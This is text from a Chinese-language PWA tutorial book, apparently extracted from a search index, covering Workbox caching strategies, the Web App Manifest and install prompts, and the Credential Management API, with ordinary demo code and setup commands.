StaleWhileRevalidate：从缓存中读取资源的同时发送网络请求更新本地缓存 这些策略与前面介绍资源请求响应策略的章节中简易实现的缓存策略做对比可以发现，其原理基本是一致的，当然在具体实现上 Workbox 考虑得更为复杂而全面以应对各式各样的生产环境。我们可以通过前面简易实现的策略来加深对 Workbox 缓存策略的认识。 下面举个例子来演示 Workbox 缓存策略的使用。假设需要对 /api 的资源请求采用 NetworkFirst 的策略，那么相应的路由规则和策略的使用代码如下所示： workbox.routing.registerRoute(/\\/api/, new workbox.strategies.NetworkFirst()) 缓存策略配置 Workbox 缓存策略均可进行如下配置： cacheName：指定当前策略进行资源缓存的名称； plugins：指定当前策略所使用的插件列表； 对于需要使用 Fetch API 来发送网络请求的策略将会多出以下配置项： fetchOptions：作为 Fetch API 的第二个参数透传给当前策略中所有使用到的 Fetch API； 对于需要使用 Cache API 操作本地缓存的策略将多出以下配置项： matchOptions：作为 Cache 对象所提供的查找方法 match 的第二个参数透传给当前策略中所有使用到 cache.match 的地方。 接下来通过一些例子来演示缓存策略的配置以及配置生效的情况。 指定资源缓存名称 假设我们需要针对图片资源单独进行存储管理，那么可以在策略中设置 cacheName 来指定缓存名称： workbox.routing.registerRoute( /\\.(jpe?g|png)/, new workbox.strategies.CacheFirst({ cacheName: 'image-runtime-cache' }) ) 这样当站点图片资源缓存成功之后，打开 Chrome 开发者工具 > Applications > Cache Storage，就可以看到此时多了一个名为“image-runtime-cache”的缓存空间，里面缓存的内容全是图片资源。 添加插件 Workbox 提供了一些功能强大的插件来强化缓存策略，在这里简单演示一下如何使用 workbox.expiration.Plugin 来实现对图片资源的过期管理： workbox.routing.registerRoute( /\\.(jpe?g|png)/, new workbox.strategies.CacheFirst({ plugins: [ new workbox.expiration.Plugin({ // 对图片资源缓存 1 星期 maxAgeSeconds: 7 * 24 * 60 * 60, // 匹配该策略的图片最多缓存 10 张 maxEntries: 10 }) ] }) ) 配置 fetchOptions 对于设置了 CORS 的跨域请求的图片资源，可以通过配置 fetchOptions 将策略中 Fetch API 的请求模式设置为 cors： workbox.routing.registerRoute( /^https:\\/\\/third-party-site\\.com\\/.*\\.(jpe?g|png)/, new workbox.strategies.CacheFirst({ fetchOptions: { mode: 'cors' } }) ) 配置 matchOptions 假设图片资源缓存的存取需要忽略请求 URL 的 search 参数，可以通过设置 matchOptions 来实现： workbox.routing.registerRoute( /\\.(jpe?g|png)/, new workbox.strategies.CacheFirst({ matchOptions: { ignoreSearch: true } }) ) 基于 Workbox 改造 Service Worker 在前面章节内容当中，我们使用了自行封装的方法编写 Service Worker 文件，实现了示例页面的离线可访问。接下来，我们将基于 Workbox 实现同样功能的 Service Worker。 // 引入 workbox 核心 importScripts('https://storage.googleapis.com/workbox-cdn/releases/4.2.0/workbox-sw.js') // 预缓存 workbox.precaching.precacheAndRoute([ { url: '/index.html', revision: '5ed70e0c237b4c66' }, '/index.f8666b443c7a0e84.js', '/index.1236d1250f7ffbdc.css' ]) // 动态缓存 workbox.routing.registerRoute( /\\/article\\.json$/, new workbox.strategies.StaleWhileRevalidate() ) workbox.routing.registerRoute( /\\/statistics\\.json$/, new workbox.strategies.NetworkOnly() ) 此时页面展示的效果与前面的例子是一样的： 小结 Workbox 的功能非常完善，插件机制也能够很好的满足各种业务场景需求，如果自己手动维护一个应用的原生的 Service Worker 文件工作量非常巨大，而且有很多潜在的问题不容易被发现，Workbox 很好的规避了很多 Service Worker 潜在的问题，也大大减小了 Service Worker 的维护成本，所以建议大家在开始考虑使用 Service Worker 的时候优先考虑 Workbox。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter06.html":{"url":"chapter06.html","title":"第6章 用户留存","keywords":"","body":"用户存留 用户存留一直是网站应用保持活跃度的一项重大课题。通过自身过硬的品质和适当的营销手段吸引到用户之后，PWA 提供了一系列方法来提高网站吸引力，增加网站与用户的互动性等等，达到提高用户留存率的目的。 添加到主屏幕 网站应用向来需要依附于浏览器，在一般情况下，网站首先需要打开浏览器，然后输入网址或者打开书签，才能够访问到网页内容。这一流程相比起直接占领主屏的原生应用来说简直是绕了一个大弯，这也是原生应用相对于网站应用更为方便的原因之一。因此网站应用也迫切地需要这一功能。PWA 新增了 manifest.json 配置文件，用于定义添加到桌面的图标和应用名称、打开应用的启动动画，并且通过修改显示类型的配置项，可以隐藏掉浏览器相关 UI（如导航栏、工具栏等等），使得从主屏幕直接打开的网站应用更像原生应用。 凭证管理 提高网站吸引力的方法少不了长效的账号机制建立，只有通过账号机制才能够更有效地获取并分析用户需求，从而给予更为准确的个性化服务。在这个方面，PWA 新增了凭证管理 API，提供了更为高效和安全的用户身份凭证存储和读取的功能，用以简化及优化用户登录流程，从而提高用户登录率。 桌面通知 桌面通知是一种时效性最强的与用户沟通的方式，即使在应用未打开的情况下，桌面通知依然能够在设备的通知栏显示推送的通知，能够立即引起用户的注意，对于一些突发事件、限时活动、重大升级等等时效性要求很高的场景，桌面通知总是最好的选择。这也是过去原生应用功能强于网站应用的原因之一。因此 PWA 提供了 Notification API，补全了这一功能。 消息推送 有了桌面通知作为消息展示的载体之后，浏览器还提供了专门的消息推送方法，使得网页即使在未打开的情况下，也能够接收到后端推送的消息，并且结合 Notification API 就能够做到离线的消息推送与通知展现了。 支付方法 对于用户留存来说，浏览器的支付功能就是培养用户习惯的利器，一旦用户习惯了在浏览器中使用支付 API 进行购物等消费活动，那么用户留存率自然就提高了。而且现代社会很多人都会有网上购物的需求，提供统一方便使用的支付界面是 Payment Request API 的目标之一。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter06/1-manifest-json.html":{"url":"chapter06/1-manifest-json.html","title":"6.1 Web 应用清单","keywords":"","body":"Web 应用清单 Web 应用清单（Web App Manifest）是一份 JSON 格式的文件，它定义了网站应用的相关信息，包括应用名称、图标、启动方式等等。当网站提供了这么一份应用程序清单，并且满足一定的生效条件之后，将具有添加到主屏幕的能力。 添加到主屏幕的网站并不等同于“添加到桌面快捷方式”。如下图所示，当网站添加到主屏幕之后，它将具有如同 Native App 一样独立的图标和名称；点击图标打开网站，资源加载的过程并不会像普通网页那样出现白屏，取而代之的是一个展示应用图标和名称的启动页面，资源加载结束时加载页消失；当网页最终展现时，地址栏、工具栏等浏览器元素将不会展现出来，网页内容占满屏幕，看起来与 Native App 一样。 添加到主屏幕的好处有很多，主要在用户黏性和用户体验上，如下。 首先是减少了网站入口深度，用户可以直接从主屏幕直达站点； 其次是能够让网站具有更加接近原生体验的特性，具有启动页面，脱离浏览器 UI； 最后，添加到主屏幕的网站如同安装原生应用那样，被纳入应用抽屉中，并且可以通过系统设置直接对站点进行设置。 接下来看看如何使用 Web 应用程序清单。 添加 manifest.json 首先我们准备一份包含常用配置的 manifest.json 文件，如下。 { \"name\": \"Progressive Web App\", \"short_name\": \"PWA\", \"start_url\": \"/?from=homescreen\", \"icons\": [ { \"src\": \"/static/img/icons/android-chrome-192x192.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" }, { \"src\": \"/static/img/icons/android-chrome-512x512.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" } ], \"display\": \"standalone\", \"background_color\": \"#ffffff\", \"theme_color\": \"#1976d2\" } 然后在站点 HTML 页面的 中通过 link 标签引入该文件。 上面两个步骤就完成了 Web 应用清单文件的编写。 添加到主屏幕 目前存在两种方式将站点添加到主屏幕。首先第一种就是用户自主添加至桌面，当网站的 Web 应用清单生效时，部分浏览器菜单栏会多出“添加到屏幕”的选项，用户可以主动将网站添加到桌面。但是大部分用户都不会这么去做，而且目前仅有 Chrome、Firefox 等少量浏览器会提供这样的选项，因此接下来重点介绍第二种添加到主屏幕的方式：应用安装提示。 对于一些用户经常浏览的 PWA 站点，浏览器会在相应页面打开的时候，以适当的频次弹出应用安装提示，询问用户是否要将当前站点添加到主屏幕，如下图所示。用户点击按钮接受，将利用 manifest.json 文件中定义的名称、图标和启动地址等信息在主屏幕生成 PWA 应用入口。 如果期望浏览器展现应用安装提示，需要满足一定的规则： 需要 manifest.json 文件，并且包含以下配置 name 或 short_name 定义应用名称，优先采用 short_name start_url 指定启动 URL icons 并且包含 144×144 的 PNG 格式的方形图标声明 display 指定显示模式，并且必须取值 standalone 或 fullscreen 站点必须注册 Service Worker Chrome 要求 Service Worker 且必须监听 fetch 事件 站点通过 HTTPS 访问（调试模式下允许 http://127.0.0.1 或 http://localhost 访问） 站点在同一浏览器中至少访问过两次，并且两次访问间隔至少为 5 分钟 安装提示展现的规则是浏览器内置的，开发者无法主动去触发它，否则每个站点都可能会不加节制地触发展现安装提示，导致功能滥用，严重破坏用户体验。因此设定了两次以上访问，并且两次访问间隔在 5 分钟以上的限制，既确保了站点是用户经常浏览的站点，也同时能保证在用户频繁切换页面的情况下不会弹出安装提示打断浏览体验。 对于不同浏览器而言，安装提示的样式和展现逻辑可能存在区别，不过都是大同小异，开发者只要满足上述提到的各项条件即可。 设置启动页面 从主屏幕打开的网站应用时，会首先展示启动页面，同时应用后台进行加载资源，渲染首屏等准备工作，避免了页面在这个过程中显示白屏，给用户一种从打开到展现的连贯性体验。如下图所示，启动页面一般由应用图标、应用名称和背景色构成： 启动页面通过 manifest.json 文件的以下配置生成： name 或 short_name 定义应用名称，优先采用 name icons 应用图标 display 显示模式，必须取值 standalone 或 fullscreen background_color 背景颜色，支持 RGB 颜色定义 由于启动页面是资源加载过程中显示的临时页面，其展示过程会比较短，建议选择首页主色调作为背景色，这样采用相同的颜色，就可以实现从启动页面到首页的平稳过渡。 配置项详解 前面主要介绍了 Web 应用清单能够给 PWA 带来什么样的新功能和新体验，我们在前面的内容里只是简单介绍了这些新功能所依赖 Web 应用清单的最小化配置，并未对这些配置项的功能、取值等进行具体展开。在这个小节里，我们将对一些常用的配置项进行详细说明。 name 和 short_name name，short_name，用来配置网站应用的名称。其中 name 为应用全称，用于应用安装提示、启动页面的显示；short_name 为应用名的简写，用于添加到主屏幕时的应用名展示。应用名称是 Web 应用清单必须的配置项，因此 name 和 short_name 需要至少配置其中一项。如下图所示，当配置 name 为 Progressive Web App，short_name 为 PWA，那么在安装提示和启动页面上将展示 Progressive Web App，而添加到桌面的快捷方式将显示 PWA。 icons icons 用来定制应用图标。icons 接收的是一个图标描述对象列表，每个图标的描述对象包含三个属性： src：字符串，图标 URL； sizes：字符串，图标尺寸，格式为 宽x高，数值单位默认为 px。对于 .ico 类型的图标支持多种尺寸的情况，可以使用空格作为间隔，比如 48x48 96x96 128x128； type：字符串，非必填项，图标的 mime 类型，可以用来让浏览器快速忽略掉不支持的图标类型。 开发者可以传入一系列尺寸大小的图片描述对象，浏览器会自动根据当前分辨率和图标的用途选择合适尺寸的图片，比如主屏幕显示会选择 144x144 大小的图标，而启动页面则会选择尺寸更大一些的图标。 start_url start_url 用来定义添加到桌面后的启动 URL。start_url 可以采用绝对路径和相对路径的方式定义，如果采用的是相对路径，其相对的基础路径为当前 manifest.json 文件的 URL。比如 start_url 为 ../hello，而 manifest.json 的路径为 https://path/to/manifest.json 那么启动的 URL 为 https://path/hello。 在目前的条件下，浏览器尚未提供任何属性值或者环境变量来帮助程序判断当前的网站是直接通过浏览器打开还是通过桌面图标启动的，但我们可以利用 start_url 来简单地实现这个功能。通过在 start_url 增加 query 参数，比如增加 from=homescreen 这样的参数，那么我们就可以在程序里通过获取 URL 上的 query 参数进行判断，进而去控制调整页面的展现逻辑、去发送渠道展现统计等等。 display display 用来定义从桌面打开的网站的显示模式。目前支持的显示模式有以下几种： 显示模式 描述 降级显示类型 fullscreen 全屏模式，页面占满整个屏幕，包括移动设备的状态栏都会被页面覆盖 standalone standalone 独立模式，浏览器相关UI（如导航栏、工具栏等）将会被隐藏，移动设备状态栏不会被覆盖 minimal-ui minimal-ui 显示形式与standalone类似，浏览器相关UI会最小化为一个按钮，不同浏览器在实现上略有不同，支持度较低 browser browser 浏览器模式，直接通过浏览器打开网页的普通展现方式，包含地址栏、工具栏等浏览器元素 None 在默认情况下，网站应用将以 browser 模式来显示，展示出地址栏、工具栏等浏览器元素，这不但挤占了宝贵的屏幕可视区域，同时也不利于用户专注于当前的站点服务。有了 display 配置项，开发者可以根据当前网站应用的形态选择不同的显示模式，比如 HTML5 游戏，可以选择 fullscreen 模式，完全占满屏幕减小游戏过程误操作的可能；比如具有闭环服务的站点，则可以选择 standalone 模式将用户留在当前的网站中，减少跳出的可能。 background_color 和 theme_color background_color 定义网站背景色，在显示启动页面时生效，如下图所示，当 background_color 设置为 #ffffff 时，启动页面的背景显示为白色。 theme_color 定义网站的主题色，theme_color 会影响到浏览器 UI 元素的显示，如下图所示，当 theme_color 设置为 #1976d2 时，启动页面的顶部手机状态栏的颜色显示为蓝色。 当使用浏览器正常访问页面时，可以看到即使定义了 theme_color，浏览器的地址栏、工具栏等并没有变成蓝色，这是因为页面主题色是由 HTML 所通过 meta 标签所定义的，标签如下所示： 这样，即使在浏览器模式下，浏览器 UI 元素也将会变成蓝色的了。 Web 应用清单所定义的各种颜色属性目前仅支持 RGB 颜色定义，也就是说 #ffffff、#fff、rgb(255, 255, 255) 这类定义都是合法的，也支持直接使用内置的颜色名定义，比如 red、blue、yellow 等等，其余都不合法。 在设置 background_color 和 theme_color 的时候，应该尽可能地选择页面主题色，这样才会使得页面与浏览器 UI、启动页面等元素过渡自然，彼此融为一体。 控制应用安装提示 前面提到开发者无法主动触发安装提示的弹出，但浏览器提供了一些方法来对弹出效果进行微调，比如推迟提示、取消提示等等。 浏览器提供了 beforeinstallprompt 事件来对安装提示的弹出行为进行监听和操作，监听该事件的语法如下所示： window.addEventListener('beforeinstallprompt', function (e) { // 安装提示即将弹出 }) 判断用户安装行为 beforeinstallprompt 事件回调返回了一个名为 userChoice 的 Promise 对象，当用户对安装提示进行操作之后，userChoice 会返回用户的选择结果对象 choiceResult，该对象具有 outcome 属性，如果用户选择“添加到主屏幕时”，outcome 的值为 accept，反之为 dismissed。 window.addEventListener('beforeinstallprompt', function (e) { e.userChoice.then(function (choiceResult) { if (choiceResult.outcome === 'accept') { // 用户将站点添加至桌面 } else { // 用户取消安装 } }) }) 取消提示 在某些情况下，我们不希望弹出安装提示，beforeinstallprompt 的事件回调提供了 preventDefault() 方法来进行取消操作。关键代码如下所示： window.addEventListener('beforeinstallprompt', function (e) { // 阻止添加到主屏对话框弹出 e.preventDefault() }) 推迟提示 除了直接取消安装提示之外，我们还可以将弹出事件收集起来，等到特定的时候再做触发，从而达到推迟提示的目的。比如在某些应用场合下，直接弹出安装提示会打断用户操作，我们可以先将默认的提示行为取消掉，并且把这个事件回调用变量存起来，然后在页面上设计一种更为友好的 UI 去提醒用户，当用户主动点击 UI 确认之后，再去重新调用事件的 prompt 触发安装提示的展现。 下面的示例展示了推迟提示的一种方案，我们先下载示例代码到本地，在命令行中运行如下命令。 # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter06 目录 $ cd chapter06/install-prompt # 安装 npm 依赖 $ npm install # 安装成功后启动 chapter06 示例 $ npm run server 在看到命令行中输出 Server start on: http://127.0.0.1:8088，意味着已经成功启动，这时，打开浏览器，访问 http://127.0.0.1:8088 能看到如下图所示的页面。页面上放置了一个按钮，默认为灰色状态，当捕获到安装提示事件之后，取消默认的弹出行为并且把事件存下来，同时页面上把按钮颜色显示出来，点击按钮之后，再弹出安装提示，同时置灰按钮。 在示例 public/index.html 中可以查看相关代码，这段代码的关键点在于，首先是调用 e.preventDefault() 阻止默认的安装提示展现，其次设置了 savedPrompt 变量用来存放安装提示的事件对象，最后在适当的时候调用 savedPrompt.prompt() 方法重新触发安装提示的的展现，从而整体实现推迟提示的效果。 // 获取按钮元素 let button = document.getElementById('btn') // 保存安装提示事件 let savedPrompt window.addEventListener('beforeinstallprompt', function (e) { // 阻止默认提示弹出 e.preventDefault() // 把事件存起来 savedPrompt = e // 显示按钮 button.classList.remove('disabled') }) button.addEventListener('click', function () { // 隐藏按钮 button.classList.add('disabled') // 触发安装提示展现 savedPrompt.prompt() // 用户行为判断 savedPrompt.userChoice.then(function (result) { // 用户操作之后清空事件 savedPrompt = null if (result.outcome === 'accept') { // 用户将站点添加到桌面 } else { // 用户取消操作 } }) }) 调试 Web 应用清单 调试 Web 应用清单的方式非常简单，Chrome 开发者工具目前已经提供了相关调试功能。 用 Chrome 打开待调试的网页，同时打开开发者工具，切换到 Application 面板，然后点击 Manifest 标签，如图所示，如果 manifest.json 文件被网页成功引入的话，开发者工具面板将会显示相关属性信息，如果有个别配置项配置错误，对应的属性信息将不会显示出来。 同时可以在开发者工具面板右上角中找到 Add to homescreen 的链接，点击之后将会弹出添加到桌面的安装提示。如果配置存在错误的话，将会在控制台面板提示相关错误信息，我们可以根据错误提示对 manifest.json 进行修改，并完善其他条件。 如果没有找到 Add to homescreen 的链接，在 manifest.json 配置正确的情况下，也可以通过点击 Chrome 右上角进行安装（低版本 Chrome 可能需要将 chrome://flags 中的 Desktop PWAs 项设置为 Enabled）。 如果想要在手机上查看效果，需要在系统中先查看浏览器是否开启了添加到桌面权限，然后通过 Fidder 或者 Charles 等工具设置代理，在浏览器中打开本地站点，就可以调试网站应用添加效果了。 浏览器支持度 Web App Manifest 仍然处于 W3C 的草案阶段，但是 Chrome、手机百度、小米等浏览器已经支持了这项标准。虽然 iOS 11.3/ Safari 11.1 宣布支持了 Web App Manifest ，但是根据实际的测试，目前只有部分属性得到了一定程度的支持。不过值得观察的是，Apple 也在不断改进 iOS 下的 PWA 体验，例如在最新的 iOS 12.2 版本中，在应用切换时，PWA 应用不会被重新启动导致回到首页，极大优化了 iOS 系统的 PWA 体验。 如果希望为 iOS 上 PWA 的启动效果提供更好的兼容性，可以通过使用 Safari 的私有 meta/link 属性来配置桌面图标、状态栏颜色等。 桌面 PWA 安装 PC 桌面端已经实现对 PWA 各项技术的支持，部署 Web App Manifest 的网站应用，在 PC 桌面同样可以像原生系统应用一样添加至主屏幕。而对于移动端的各配置项，不需要进行新的升级也依然适用于桌面 PWA 。例如在下图中，theme_color 将用于设置应用窗口状态栏的颜色。同时对于符合条件的应用，浏览器也会在合适的时候弹出应用安装提示。 桌面 PWA 提供了很大的想象空间，对于不需要依赖很多 Device API 的系统来说，使用桌面 PWA 非常合适，例如管理系统等，兼具 BS 架构和 CS 架构的\b优点，而且还大大降低开发成本，在一定程度上可以代替 Electron 等技术产品， Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter06/2-credentials-api.html":{"url":"chapter06/2-credentials-api.html","title":"6.2 凭证管理 API","keywords":"","body":"凭证管理 API 一直以来，登录网站总是一件非常麻烦的事情，尤其是在移动端，如果过早要求用户进行登录，转化率会大大降低。用户输入账号密码并提交给服务器进行校验，服务器校验通过之后将创建 session 保持会话。基于安全角度的考虑，用户的账号密码是不允许通过 JavaScript 写入本地存储之中的。当 session 会话过期时，用户将不得不再次输入账号密码信息进行登录，体验很差。使用浏览器提供的凭证管理 API（Credential Management API）可以在安全与体验之间找到更好的平衡。 在本节中，我们将为 PWA 示例设计登录功能，展示使用凭证管理 API 是如何优化用户登录体验的。在命令行中运行如下命令，下载示例代码到本地。 # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter06/credentials 目录 $ cd chapter06/credentials # 安装 npm 依赖 $ npm install # 安装成功后启动 chapter06/credentials 示例 $ npm run server 在看到命令行中输出 Server start on: http://127.0.0.1:8088，意味着已经成功启动，这时，打开浏览器，访问 http://127.0.0.1:8088 能看到如下图所示的页面。我们在示例首页添加一个登录按钮，点击按钮会跳转至登录页面，用户在该页面表单进行账户密码输入。 在继续优化之前，先通过 “自动填充（autofill）”的功能改进浏览器表单。通过对表单元素增加 autocomplete属性，浏览器会根据这一属性进行表单类型识别，并将表单输入内容存储到浏览器中，这些存储的数据无法被 JavaScript 访问到，因此相对安全。比如下面的表单，浏览器会将 autocomplete 标识为 username 和 current-password 的字段内容提取出来，构造出用户身份凭证信息。有关自动填充的更详细的说明，请参考 Form control infrastructure。 在示例文件 public/login.html 中可以查看示例中的表单属性设置如下。 登录 其他登录方式 使用 Github 账号登录 自动填充功能在一定程度上解决了用户重复输入账号密码的问题，但是还存在不少需要改进的地方。 采用第三方账号登录的方式，由于登录流程不涉及表单填充，因此无法触发自动填充功能； 对于采用 AJAX、Fetch 等方式异步提交的登录表单，无法被自动填充机制捕获并且保存； 自动填充的行为对网站来说是完全不可见的，网站既不知道身份凭证已被浏览器存储，也不知道表单密码已被浏览器自动填充，无法更精细地控制登录流程； 自动填充机制对更新密码的支持度较低。 因此，针对用户身份凭证目前所存在的问题，使用凭证管理 API 可以进一步优化表单登录的过程。需要注意的是，目前凭证管理 API 仍处于草案阶段，现有浏览器的支持程度不高，在使用前需要进行 API 检测并做好相应的降级处理。 if (window.PasswordCredential || window.FederatedCredential) { // 进行凭证管理 API 的相关操作 } 保存用户凭证 优化表单登录的第一步，就是能够保存用户登录凭证。一旦用户登录网站验证通过，可以请求用户允许浏览器保存用户凭证。浏览器提供 navigator.credentials.store() 方法对用户身份凭证进行存储。 该方法需要传入一个类别为 Credential 的对象作为参数。目前存在两种派生自 Credential 的类，分别是密码凭证 PasswordCredential 和联合凭证 FederatedCredential，开发者需要根据用户的登录类型选择相应的凭证进行存储。如果用户使用账号密码进行登录的话，那么可以使用 PasswordCredential 构造并存储身份凭证。 let cred = new PasswordCredential({ id: 'example@baidu.com', password: 'example_password', name: '路人甲', iconURL: 'https://path/to/icon.png' }) navigator.credentials.store(cred) 其中 id 和 password 为必填字段，分别对应用户登录信息的用户名和密码，name 和 iconURL 是选填字段，用于后续账号选择器的信息展示。 同时浏览器也提供 navigator.credentials.create() 方法实现异步实例化凭证，新的声明方法如下所示： // passwordcredential let pwdCred = await navigator.credentials.create({ password: { id: 'example@baidu.com', password: 'example_password', name: '路人甲', iconURL: 'https://path/to/icon.png' } }) 在本小节示例中查看 public/script/login.js 登录逻辑，我们在用户点击登录按钮时阻止表单提交事件，验证用户身份信息正确后，可以保存对应的用户信息。示例中表单已经添加 autocomplete 属性，因此可以直接利用表单 HTMLElement 创建 PasswordCredential 实例。 let form = document.querySelector('#login') form.addEventListener('submit', function (event) { event.preventDefault() fetch('/auth/password', { method: 'POST', credentials: 'include', body: new FormData(event.target) }).then(function (res) { // 验证用户邮箱密码 if (res.status === 200) { return Promise.resolve() } else { return Promise.reject('login error') } }).then(function () { // 判断是否支持 Credential API if (window.PasswordCredential) { // 保存用户凭证 var cred = new PasswordCredential(event.target) return navigator.credentials.store(cred) } else { return Promise.resolve() } }).then(function () { // 登录成功跳转至首页 window.location.href = '/' }).catch(function (error){ // 登录出错展示错误信息 showErrorToast() }) }) 本示例中在 public/assets/mockData/user.json 中模拟存储了测试账号，运行示例输入测试账号邮箱密码，可以看到浏览器弹出类似下图的对话框。 凭证保存的过程是一个异步的过程，在执行 navigator.credentials.store(cred) 进行保存时，方法会返回一个 promise 对象，同时在页面上弹出对话框提示用户是否进行密码存储，只有当用户选择“保存”时，promise 对象才会 resolve，点击“x”关闭对话框或者点击“一律不”时，promise 将 reject。 需要注意的是，如果用户选择了“一律不”，那么在后续调用 navigator.credentials.store(cred) 时，返回的 promise 对象将直接 resolve 而不会弹出任何对话框。因此在设计凭证存储流程时，一定要记住只在最合适的时候发起凭证存储，\b比如在发起凭证存储前先引导并提示用户，不要惹恼用户，否则用户一旦选择了“一律不”，后面就很难再有机会了，同时，存储流程需要考虑到凭证存储成功和失败之后的应对措施。 自动登录 当点击登录按钮时，常见的页面交互是弹出登录表单或者跳转至登录页面，用户继续在表单中进行繁琐的输入操作。而当浏览器存储用户凭证后，使用凭证管理 API，可以有效的缩短用户登录时间，实现只需点击登录按钮就可完成登录。接下来\b看看实现自动登录功能需要的几个步骤。 获取用户凭证 浏览器提供 navigator.credentials.get() 方法来获取存储的身份凭证，可以通过配置 password 和 federated 来指定要获取的用户凭证。另一个参数 mediation 用于配置账号选择器行为，为了实现自动登录通常设置 mediation 值为 silent，在用户登录时不会弹出账户选择器，在下文中会详细介绍其用法。 需要注意的是，由于执行 navigator.credentials.get() 将可能会弹出账号选择器打断用户操作，因此需要保证只有在真正需要登录的时候再去调用该方法，比如在调用前判断一下当前 session 会话是否过期。 if (window.PasswordCredential || window.FederatedCredential) { if (!isLogin()) { // 获取用户凭证 let cred = await navigator.credentials.get({ password: true, mediation: 'silent' }) } } 发送凭证验证用户 获取用户凭证后，首先需要判断是否获取凭证成功。成功后，可以通过 Credentials.type 方法判断当前凭证的类型，可能的取值为 password 和 federated，分别对应密码凭证和联合凭证，开发者可以根据不同类型设计不同的凭证发送逻辑，同时对于联合凭证，则可以进一步通过 provider 属性区分不同第三方账号的登录逻辑。 在示例文件 public/script/index.js 中可以查看自动登录相关的逻辑，包括获取用户凭证和发送凭证的过程，同时支持 password 和 federated 两种方式，关于使用联合凭证登录在下文会很快提到。 function autoLogin () { if (window.PasswordCredential || window.FederatedCredential) { return navigator.credentials.get({ password: true, federated: { providers: ['https://github.com'] }, medition: 'silent' }).then(function (cred) { if (cred) { switch (cred.type) { case 'password': return loginWithPassword(cred) case 'federated': switch (cred.provider) { case 'https://github.com': return loginWithGithubAccount(cred) } } } else { return Promise.reject() } }).then(function (res) { if (res.status === 200) { return Promise.resolve() } else { return Promise.reject('login error') } }) } else { return Promise.resolve() } } 对于发送凭证，并没有太多要求，一般来说，只要是异步发送即可，比如 AJAX、Fetch API 都可以，本节示例中以密码凭证和 Fetch API 为例。PasswordCredentials 和 FederatedCredentials 实例对象都可以访问到生成凭证时所传入的参数，因此可以像正常对象那样读取属性，并构造出对应的身份认证请求参数即可。 function loginWithPassword (cred) { let form = new FormData() form.append('email', cred.id) form.append('password', cred.password) return fetch('/auth/password', { method: 'POST', credentials: 'include', body: form }) } 在已保存凭证的示例中点击退出，退出登录后重新点击首页的登录按钮，此时浏览器会弹出类似下图的提示，不需要再跳转至登录页输入密码，就登录成功并更新首页登录状态。 发送到服务器端校验的凭证有可能会存在认证失败的情况，发生这种情况的原因一般是密码需要更新，因此需要在认证失败时及时展现登录表单，让用户重新填写身份凭证信息，重新校验，并更新存储的身份凭证。 第三方账号登录 用户希望使用第三方账号登录的情况越来越普遍，如果网站登录表单支持使用第三方账户登录，可以使用联合凭证的方式，先通过 FederatedCredential 对象构造并存储身份凭证。 创建联合登录凭证与密码凭证类似，其中 id 和 provider 为必填字段，其中 id 为标识账户的标志，可以是用户的 email、username 等等能够唯一标识用户的属性值。通常第三方账户登录使用 OAuth2.0 等方式授权，不能直接用 assess_token 等具有时效性的值作为 id，需要做好 id 与 assess_token 的映射关系。provider 为第三方账号提供方，需要填入符合 URL 校验规则的账号提供方网址。 let cred = new FederatedCredential({ id: 'example@baidu.com', provider: 'https://www.baidu.com', name: '路人甲', iconURL: 'https://path/to/icon.png' }) navigator.credentials.store(cred) let fedCred = await navigator.credentials.create({ federated: { id: 'example@baidu.com', provider: 'https://www.baidu.com', name: '路人甲', iconURL: 'https://path/to/icon.png' } }) 一旦浏览器存储了网站的第三方登录凭证，用户再次登录网站时，可以直接获取用户凭证进行验证，实现只需要点击“使用 Github 账号登录”的表单按钮就直接完成了用户登录。 同时我们也可以如下代码所示，扩展支持多个第三方账户登录。 navigator.credentials.get({ password: true, federated: { providers: ['https://www.baidu.com', 'https://github.com'] } }).then(function (cred) { if (cred) { switch (cred.type) { case 'password': // PasswordCredential 凭证处理 return loginWithPassword(cred) case 'federated': // FederatedCredential 凭证处理 switch (cred.provider) { case 'https://www.baidu.com': // 调起百度第三方登录 return loginWithBaiduAccount() case 'https://github.com': // 调起 github 第三方登录 return loginWithGithubAccount() } } } else { return Promise.reject() } }) 修改凭证信息 当用户的密码修改之后，存储的身份凭证将会失效，需要及时进行更新。在具体实现上只需要调用 navigator.credentials.store(cred) 进行新凭证存储即可，此时页面会弹出凭证更新提示对话框，只有当用户同意时身份凭证才会更新成功。对于 PasswordCredential 类型的凭证，浏览器会根据 id 指定身份凭证信息进行覆盖；FederatedCredential 则会根据 provider 和 id 指定身份凭证信息进行覆盖。 使用账户选择器登录 一个网站用户可能拥有多个账户，在登录时直接提供账户选择器也可以跳过传统的表单登录方式。使用账号选择器登录的方法与自动登录一致。当用户点击登录按钮时，调用 navigator.credentials.get() 方法，并通过mediation 设定账号选择器的展现方式为optional 或 required。 mediation 设置为 required 时，当用户登录时，账户选择器每次都会展现。而如果采用 mediation 为 optional 的模式获取凭证，即 navigator.credentials.get({mediation: 'optional'})，只要用户第一次选择好身份凭证，在下一次重新获取时，将不会弹出账号选择器而直接返回上次选择好的身份凭证信息，从而起到简化用户登录流程的作用。这时如果用户需要重新选择账户，可以通过调用 navigator.credentials.preventSilentAccess() 方法来取消这个静默获取凭证的过程。 使用方法非常简单，只需要直接执行该函数即可： navigator.credentials.preventSilentAccess() 这里需要注意的是，preventSilentAccess() 方法主要配合 mediation 为 optional 一起使用。如果 mediation 为 silent，即采用静默获取凭证的方式，preventSilentAccess() 会导致这种静默获取直接返回 null。 当 mediation 取值为 silent 或者 optional，且返回的账号选择列表中只有一个凭证，那么 get() 返回的 promise 对象将直接 resolve 该凭证信息，但是当账号选择列表存在多个凭证时，如果 mediation 为 silent，那么 promise 将 resolve(null)，而 optional 将弹出账号选择器供用户选择。除开以上这些情况，当用户并未从账号选择器中选择相应的账号信息，同样的 promise 也将 